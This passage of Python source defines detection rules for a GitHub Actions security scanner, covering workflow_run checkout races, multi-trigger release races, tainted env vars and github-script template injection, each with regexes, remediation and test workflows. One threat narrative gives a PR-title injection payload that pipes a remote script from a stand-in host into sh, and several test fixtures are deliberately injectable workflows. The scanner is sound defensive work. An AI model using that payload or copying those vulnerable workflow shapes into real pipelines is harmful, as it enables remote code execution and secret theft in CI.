                "      - run: echo hi\n"
                "  consume:\n"
                "    needs: produce\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                '      - run: echo "${{ needs.produce.outputs.rid }}"\n'
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker opens a PR whose title is "
            '``"; curl evil.sh|sh; #``.  A producer job in the '
            "workflow declares an output sourced from "
            "``github.event.pull_request.title`` (often as a "
            'convenience: "the next job will need this").  A consumer '
            "job downstream — typically the one with elevated "
            "permissions because the producer's lower-privilege scope "
            'made it "safe" to handle PR data — references '
            "``${{ needs.produce.outputs.title }}`` inside a ``run:`` "
            "block.  The PR title executes as a shell command in the "
            "consumer's environment, with the consumer's full token "
            "and bound secrets.  Single-job rules miss this because "
            "the taint crosses the job boundary."
        ),
        incidents=["Ultralytics April 2025"],
    ),
    # =========================================================================
    # TAINT-GH-010 — workflow_run consumer without head-SHA pin
    # =========================================================================
    Rule(
        id="TAINT-GH-010",
        title=(
            "workflow_run consumer pins checkout to a mutable "
            "PR-controlled ref (head_branch / gh pr checkout)"
        ),
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A workflow triggered by ``on: workflow_run`` checks out "
            "code at a ref the PR author controls between trigger and "
            "consume: either ``ref: ${{ github.event.workflow_run."
            "head_branch }}`` (a branch name, not a hash), or "
            "``gh pr checkout`` / ``git checkout`` against a "
            "PR-derived reference. The consumer typically runs with "
            "elevated permissions / secrets to publish artifacts the "
            "upstream built; a force-push to the PR branch between "
            "T1 (build) and T2 (deploy) substitutes the code the "
            "deploy step runs under the upstream's implicit success "
            "gate.\n"
            "\n"
            "Only ``head_sha`` is a stable handle on the exact code "
            "the upstream actually built. Adnan Khan's Dependabot-"
            "core dispatch race and the Trivy March 2026 supply-"
            "chain post-mortem operationalise this gap.\n"
            "\n"
            "Scope: this rule covers the explicit TOCTOU shapes only. "
            "A workflow_run consumer with a bare ``actions/checkout`` "
            "(no ``ref:``) checks out the workflow repo's default "
            "branch, which is a different threat profile and is left "
            "to a separate review-needed audit pass."
        ),
        pattern=ContextPattern(
            anchor=(
                # Anchor only on shapes that demonstrably check out a
                # PR-author-controlled ref. The bare actions/checkout
                # case is NOT in scope here (it defaults to the
                # workflow repo's default branch, not the PR head).
                r"(?:"
                # 1. Explicit ref: pointing at the mutable head_branch
                r"ref\s*:\s*\$\{\{\s*github\.event\.workflow_run\.head_branch\b"
                # 2. gh pr checkout — always follows the PR's mutable head
                r"|gh\s+pr\s+checkout\b"
                # 3. git checkout against a PR-derived workflow_run ref
                r"|git\s+checkout\s+\$\{\{\s*github\.event\.workflow_run\.(?:head_branch|pull_requests)\b"
                r")"
            ),
            requires=(
                # File MUST be triggered by workflow_run.
                r"(?m)^on:\s*workflow_run\b"
                r"|^on:\s*\n\s+workflow_run\s*:"
                r"|^on:\s*\[[^\]]*\bworkflow_run\b"
            ),
            scope="file",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Pin every checkout in a ``workflow_run`` consumer to the\n"
            "exact SHA the upstream tested:\n"
            "\n"
            "    on: workflow_run\n"
            "    jobs:\n"
            "      deploy:\n"
            "        runs-on: ubuntu-latest\n"
            "        steps:\n"
            "          - uses: actions/checkout@<sha>\n"
            "            with:\n"
            "              ref: ${{ github.event.workflow_run.head_sha }}\n"
            "\n"
            "Avoid ``head_branch`` — that's a name, not a hash.\n"
            "If you need to download artifacts (not check out code),\n"
            "still verify their attestation (sigstore / cosign) so a\n"
            "force-push between trigger and consume can't substitute\n"
            "the bytes."
        ),
        reference="https://adnanthekhan.com/posts/dependabot-core-toctou-writeup/",
        test_positive=[
            # head_branch ref: the canonical TOCTOU shape.
            (
                "on:\n"
                "  workflow_run:\n"
                "    workflows: [build]\n"
                "    types: [completed]\n"
                "jobs:\n"
                "  publish:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "        with:\n"
                "          ref: ${{ github.event.workflow_run.head_branch }}\n"
            ),
            # gh pr checkout in a workflow_run consumer.
            (
                "on: workflow_run\n"
                "jobs:\n"
                "  d:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: gh pr checkout ${{ github.event.workflow_run.pull_requests[0].number }}\n"
            ),
            # git checkout of a workflow_run-derived branch ref.
            (
                "on: workflow_run\n"
                "jobs:\n"
                "  d:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "      - run: git checkout ${{ github.event.workflow_run.head_branch }}\n"
            ),
        ],
        test_negative=[
            # head_sha pinned: the safe canonical shape.
            (
                "on: workflow_run\n"
                "jobs:\n"
                "  deploy:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "        with:\n"
                "          ref: ${{ github.event.workflow_run.head_sha }}\n"
            ),
            # Bare actions/checkout with no ref: defaults to the workflow
            # repo's default branch, not the PR head. Out of scope here;
            # left to a separate review-needed audit pass.
            (
                "on: workflow_run\n"
                "jobs:\n"
                "  deploy:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
            ),
            # Different trigger.
            (
                "on: pull_request\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
            ),
            # workflow_run consumer with no checkout at all.
            (
                "on: workflow_run\n"
                "jobs:\n"
                "  d:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: echo no checkout here\n"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker opens a PR. The upstream ``pull_request`` "
            "workflow builds the PR head SHA and reports success. A "
            "``workflow_run``-triggered deploy workflow fires on "
            "completion and runs ``actions/checkout`` with "
            "``ref: ${{ github.event.workflow_run.head_branch }}`` "
            "(or follows the PR head via ``gh pr checkout`` / "
            "``git checkout``). Between T1 (build) and T2 (deploy) "
            "the attacker force-pushes a different commit to the PR "
            "branch; the deploy checks out the new code under the "
            "upstream's success gate, with the deploy workflow's "
            "elevated permissions and secrets."
        ),
        incidents=[
            "Adnan Khan — Dependabot-core dispatch TOCTOU writeup",
            "Trivy supply-chain compromise breakdown (March 2026)",
        ],
    ),
    # =========================================================================
    # TAINT-GH-011 — Multi-trigger idempotency hole on a state-mutating step
    # =========================================================================
    Rule(
        id="TAINT-GH-011",
        title=(
            "Workflow has multiple triggers and a non-idempotent "
            "state mutator with no concurrency lock"
        ),
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-1",
        description=(
            "A workflow's ``on:`` block lists 2+ of "
            "``schedule`` / ``workflow_dispatch`` / ``push`` / "
            "``repository_dispatch`` AND contains a step that "
            "performs a non-idempotent state mutation: "
            "``gh release create`` / ``gh release edit``, "
            "``npm publish``, ``git push --tags``, "
            "``aws s3 sync ... --delete``, ``terraform apply`` "
            "without ``-lock=true`` and a remote backend, "
            "``kubectl apply`` / ``helm upgrade``, ``gcloud "
            "deploy``. Two triggers can fire within seconds (cron "
            "+ a manual dispatch, or a retry + the original) and "
            "the mutator runs twice against divergent state. "
            "Adnan Khan's Dependabot-core dispatch race is one "
            "instance of this class.\n"
            "\n"
            "The fix is either (a) a stable ``concurrency.group`` "
            "with ``cancel-in-progress: false`` so a second run "
            "queues behind the first, or (b) the mutator's own "
            "lock primitive (``terraform apply -lock=true`` with "
            "remote backend, ``--if-match`` / etag conditional "
            "writes). Review-needed by default — some workflows "
            "are genuinely idempotent (``aws s3 sync`` without "
            "``--delete`` is, ``kubectl apply`` is at the resource "
            "level), the rule surfaces the multi-trigger x "
            "mutator shape so a reviewer can audit."
        ),
        pattern=ContextPattern(
            anchor=(
                # Non-idempotent state mutators.
                r"(?:"
                r"gh\s+release\s+(?:create|edit|delete)"
                r"|npm\s+publish\b"
                r"|git\s+push\s+--tags"
                r"|aws\s+s3\s+sync\s+\S+\s+\S+\s+--delete"
                r"|terraform\s+apply(?!\s+-lock=true)"
                r"|kubectl\s+apply\b"
                r"|helm\s+(?:upgrade|install)\b"
                r"|gcloud\s+(?:run\s+deploy|deploy\s+)"
                r")"
            ),
            requires=(
                # File must list at least two triggers from the set.
                # We require both ``schedule`` and one of the other
                # three (workflow_dispatch / push / repository_dispatch),
                # OR workflow_dispatch + one of (push, repository_dispatch).
                # Encode as: file contains schedule AND (dispatch|push|...)
                # OR file contains workflow_dispatch AND (push|repository_dispatch).
                r"(?:"
                r"(?ms:^on:.*\bschedule\b.*\b(?:workflow_dispatch|push|repository_dispatch)\b)"
                r"|(?ms:^on:.*\b(?:workflow_dispatch|push|repository_dispatch)\b.*\bschedule\b)"
                r"|(?ms:^on:.*\bworkflow_dispatch\b.*\b(?:push|repository_dispatch)\b)"
                r"|(?ms:^on:.*\b(?:push|repository_dispatch)\b.*\bworkflow_dispatch\b)"
                r")"
            ),
            requires_absent=(
                # File must NOT have a stable concurrency lock.
                # Heuristic: any ``concurrency:`` key with a non-empty
                # group AND ``cancel-in-progress: false`` (or the key
                # absent — default is false). For simplicity, require
                # only that ``concurrency:`` appears anywhere in the
                # file; a richer check is a v2 follow-up.
                r"(?m)^\s*concurrency\s*:"
            ),
            scope="file",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Pick one of the two:\n"
            "\n"
            "1. Add a stable concurrency group (queue, don't drop):\n"
            "\n"
            "    concurrency:\n"
            "      group: release-${{ github.workflow }}\n"
            "      cancel-in-progress: false\n"
            "\n"
            "2. Make the mutator idempotent:\n"
            "    - terraform apply -lock=true (with remote backend)\n"
            "    - aws s3 sync without --delete\n"
            "    - npm publish only on tag refs (push: tags: ['v*'])\n"
            "    - gh release create with a stable tag the trigger\n"
            "      filters on (so a second run no-ops)"
        ),
        reference="https://adnanthekhan.com/posts/dependabot-core-toctou-writeup/",
        test_positive=[
            (
                "on:\n"
                "  schedule:\n"
                "    - cron: '0 0 * * *'\n"
                "  workflow_dispatch:\n"
                "jobs:\n"
                "  release:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: gh release create v1.0\n"
            ),
            (
                "on:\n"
                "  push:\n"
                "    branches: [main]\n"
                "  workflow_dispatch:\n"
                "jobs:\n"
                "  publish:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: npm publish\n"
            ),
            (
                "on:\n"
                "  schedule:\n"
                "    - cron: '0 1 * * *'\n"
                "  repository_dispatch:\n"
                "    types: [deploy]\n"
                "jobs:\n"
                "  deploy:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: aws s3 sync ./dist s3://prod/ --delete\n"
            ),
        ],
        test_negative=[
            (
                "on:\n"
                "  schedule:\n"
                "    - cron: '0 0 * * *'\n"
                "  workflow_dispatch:\n"
                "concurrency:\n"
                "  group: release\n"
                "  cancel-in-progress: false\n"
                "jobs:\n"
                "  release:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: gh release create v1.0\n"
            ),
            (
                "on: push\n"
                "jobs:\n"
                "  release:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: gh release create v1.0\n"
            ),
            (
                "on:\n"
                "  schedule:\n"
                "    - cron: '0 0 * * *'\n"
                "  workflow_dispatch:\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: npm test\n"
            ),
        ],
        stride=["T"],
        threat_narrative=(
            "A nightly cron triggers ``gh release create v1.0`` "
            "with the day's nightly tag. A maintainer manually "
            "dispatches the same workflow seconds later (or the "
            "system retries on transient failure). Both runs see "
            "the same starting state, both attempt the release "
            "create — the second errors mid-way after the first's "
            "partial mutation. Or worse: the second run pushes a "
            "newer commit's artefact under the same tag, "
            "overwriting the first."
        ),
        incidents=[
            "Adnan Khan — Dependabot-core dispatch TOCTOU writeup",
        ],
    ),
    # =========================================================================
    # TAINT-GH-012 — Tainted env safely double-quoted in shell sink (lint)
    #
    # Companion to TAINT-GH-001 (CRITICAL). Same source-to-sink shape
    # but the sink line double-quotes every shell reference and uses no
    # eval-class re-parsing command. POSIX parameter expansion does NOT
    # re-tokenise the value's contents inside double quotes, so a
    # straight ``echo "$VAR"`` is safe — the title's `;` or `$(...)` is
    # passed as a single literal argument.
    #
    # Kept as a finding (rather than dropped silently) because:
    #   * a downstream consumer of the value can re-parse it (eval, sh
    #     -c, sed -e), and the chain is invisible at the run: line;
    #   * teams that prefer to NEVER pass attacker-controlled bytes into
    #     a shell, even safely, can still ratchet on this rule;
    #   * the audit trail is preserved — the field test caught the FP at
    #     CRITICAL on django, and downgrading to MEDIUM with low
    #     confidence is the right ergonomics, not invisibility.
    # =========================================================================
    Rule(
        id="TAINT-GH-012",
        title=(
            "Attacker-controlled context flows through env var into a "
            "double-quoted shell reference (lint)"
        ),
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        confidence="low",
        finding_family="script_injection",
        description=(
            "A tainted GitHub-Actions context (PR title/body, comment "
            "body, head_ref, ...) flows through a step or job env var "
            "into a run: block where every reference is safely "
            "double-quoted (``\"$VAR\"`` / ``\"${VAR}\"``) and the "
            "line contains no eval-class re-parsing command. Direct "
            "shell injection at this sink is not possible — the value "
            "passes as a single literal argument. The finding stays "
            "at MEDIUM (low confidence) so reviewers can verify no "
            "downstream consumer in the same script re-parses the "
            "value (eval, sh -c, source, etc.). The unsafe shapes "
            "(unquoted reference, eval-class consumption) are "
            "covered by TAINT-GH-001."
        ),
        pattern=TaintPattern(
            kind_filter="shallow",
            sink_quote_filter="safely_quoted_only",
        ),
        remediation=(
            "If the value is only used as a single string argument "
            "(echo, printf, comparisons inside [[ ]] / [ ]), no "
            "change is required — the double-quoting is already the "
            "recommended safe shape. If you want to suppress this "
            "lint, add an inline ``# taintly: ignore[TAINT-GH-012]`` "
            "comment on the run: line, or an entry under "
            "``ignored_rules`` in ``.taintly.yml``.\n"
            "\n"
            "If the value IS later passed to ``eval``, ``sh -c``, "
            "``bash -c``, ``source``, or another re-parsing command, "
            "the chain becomes a CRITICAL TAINT-GH-001 finding "
            "instead — sanitize via parameter expansion before the "
            "re-parsing step."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            (
                "jobs:\n"
                "  log:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
                '        run: echo "PR title is $PR_TITLE"\n'
            ),
            (
                "jobs:\n"
                "  guard:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          T: ${{ github.event.pull_request.title }}\n"
                "        run: |\n"
                '          if [[ "$T" == "main" ]]; then echo on main; fi\n'
            ),
        ],
        test_negative=[
            # Unquoted — covered by TAINT-GH-001 instead.
            (
                "jobs:\n"
                "  greet:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          T: ${{ github.event.pull_request.title }}\n"
                "        run: echo $T\n"
            ),
            # eval — covered by TAINT-GH-001 instead.
            (
                "jobs:\n"
                "  greet:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          T: ${{ github.event.pull_request.title }}\n"
                '        run: eval "$T"\n'
            ),
            # Non-tainted source — no flow at all.
            (
                "jobs:\n"
                "  log:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          SHA: ${{ github.sha }}\n"
                '        run: echo "$SHA"\n'
            ),
        ],
        stride=["T"],
        threat_narrative=(
            "POSIX shell parameter expansion does not re-tokenise the "
            "value's contents inside double quotes, so a tainted env "
            "var consumed via ``echo \"$VAR\"`` or "
            "``[[ \"$VAR\" == ... ]]`` does not produce direct command "
            "injection. The lint stays in the report so reviewers can "
            "verify the value isn't fed to a downstream re-parser later "
            "in the script (eval, sh -c, source) where the safety would "
            "no longer hold."
        ),
        incidents=[],
    ),
    # =========================================================================
    # TAINT-GH-013: actions/github-script template injection (script body).
    #
    # ``actions/github-script`` runs the step's ``script:`` value as Node
    # code with a github API client preloaded.  Any ``${{ ... }}``
    # interpolated into the script body becomes literal source text in
    # the rendered JavaScript — exactly the same shape as ``run:`` shell
    # injection but with JavaScript as the executor.  The injection
    # surface is a remote-code-execution vector when the source is
    # attacker-controlled (``github.event.*``, ``inputs.*``, fork PR
    # context).
    #
    # Why a dedicated rule rather than extending TAINT-GH-001..-012:
    # those track shell sinks (``run: ${{ ... }}``).  github-script's
    # ``script:`` block is a JavaScript sink, not a shell sink, and the
    # quoting / escaping semantics differ — single quotes don't suppress
    # JS-template interpolation, double-quoted shell heuristics don't
    # apply.
    #
    # Lint-grade because the rule fires on ANY ``${{ ... }}`` in the
    # script body, including ``${{ matrix.x }}`` where the matrix is
    # locally controlled.  Such cases are still fragile: if the matrix
    # source ever shifts to ``github.event.client_payload.*`` or any
    # fork-controlled input, the same shape becomes RCE.  Reviewer's
    # call.  Surfaces under the ``template_injection`` cluster so it
    # groups with the shell-injection findings on the same workflow.
    #
    # Cross-tool corpus signal: 3 zizmor template-injection rows on
    # django/schedules.yml + django/screenshots.yml were taintly-misses
    # in PR #151's labelled set; this rule closes that recall gap.
    # =========================================================================
    Rule(
        id="TAINT-GH-013",
        title=(
            "Template expression interpolated into actions/github-script "
            "body (JS injection sink)"
        ),
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        confidence="medium",
        review_needed=True,
        finding_family="User-controlled input reaching shell execution",
        description=(
            "A step using ``actions/github-script`` interpolates a "
            "``${{ ... }}`` expression into its ``script:`` body.  The "
            "expression is rendered into the JavaScript source before "
            "Node executes it — same pattern as shell injection in "
            "``run:``, but with JS as the executor.  When the source is "
            "attacker-controlled (``github.event.*``, ``inputs.*``, "
            "fork-PR context), an attacker can break out of the "
            "intended string literal and execute arbitrary JS with the "
            "step's GitHub-API client and bound secrets."
        ),
        pattern=BlockPattern(
            # The block opens at the ``- uses: actions/github-script@``
            # line; matched lines extend through the step body until
            # indent drops back to the step level.
            block_anchor=r"^\s*-?\s*uses:\s*actions/github-script@",
            # Match any ``${{ <expression> }}`` reference inside the
            # step.  We exclude the standard ``with:`` keys whose
            # values are interpolated as configuration (not as JS body
            # source) so the rule fires only on the script-body sink.
            match=r"\${{[^}]+}}",
            exclude=[
                r"^\s*#",
                # Standard actions/github-script with: keys whose
                # values aren't part of the JS source.  ``script:`` is
                # NOT excluded — that's the sink.
                r"^\s*github-token\s*:",
                r"^\s*previews\s*:",
                r"^\s*debug\s*:",
                r"^\s*user-agent\s*:",
                r"^\s*retries\s*:",
                r"^\s*retry-exempt-status-codes\s*:",
                r"^\s*result-encoding\s*:",
            ],
        ),
        remediation=(
            "Pass the expression through an environment variable and "
            "read it from JS via ``process.env``.  ``env:`` substitution "
            "happens at runtime, not at YAML render time, so the JS "
            "source stays static and an attacker can't break out of "
            "the string literal:\n\n"
            "    - uses: actions/github-script@<sha>\n"
            "      env:\n"
            "        BRANCH: ${{ matrix.branch }}\n"
            "      with:\n"
            "        script: |\n"
            "          const branch = process.env.BRANCH;\n"
            "          // ... use `branch` in API calls ...\n"
        ),
        reference=(
            "https://docs.github.com/en/actions/security-for-github-actions/"
            "security-guides/security-hardening-for-github-actions"
            "#using-an-intermediate-environment-variable"
        ),
        test_positive=[
            (
                "jobs:\n"
                "  bot:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/github-script@v7\n"
                "        with:\n"
                "          script: |\n"
                "            console.log('${{ github.event.pull_request.title }}')\n"
            ),
            (
                "jobs:\n"
                "  bot:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/github-script@v7\n"
                "        with:\n"
                "          github-token: ${{ secrets.TOKEN }}\n"
                "          script: |\n"
                "            const branch = '${{ matrix.branch }}';\n"
                "            await github.rest.repos.listCommits({sha: branch})\n"
            ),
        ],
        test_negative=[
            # github-script with ONLY trusted with: keys — no
            # interpolation in the script body.
            (
                "jobs:\n"
                "  bot:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/github-script@v7\n"
                "        with:\n"
                "          github-token: ${{ secrets.TOKEN }}\n"
                "          script: |\n"
                "            const { data } = await github.rest.repos.get(context.repo)\n"
                "            console.log(data.name)\n"
            ),
            # No github-script step — no scope.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: echo '${{ github.event.pull_request.title }}'\n"
            ),
        ],
        stride=["E", "I"],
        threat_narrative=(
            "github-script interpolates ``${{ ... }}`` expressions into "
            "the JS source before Node executes it.  An expression "
            "sourced from ``github.event.*`` or ``inputs.*`` on a "
            "fork-PR or workflow_dispatch trigger can contain arbitrary "
            "JavaScript — single quotes don't help because ``${{ }}`` "
            "expansion happens BEFORE JS parsing.  The attacker's code "
            "executes with the step's preloaded github API client (write "
            "scopes from ``GITHUB_TOKEN`` or the workflow's permissions) "
            "and can read every bound secret.  This was the shape of "
            "the tj-actions/changed-files compromise (March 2025) when "
            "an attacker-controlled context reached a github-script "
            "step in the upgraded action."
        ),
        incidents=[
            "tj-actions/changed-files (CVE-2025-30066, March 2025)",
        ],
    ),
]
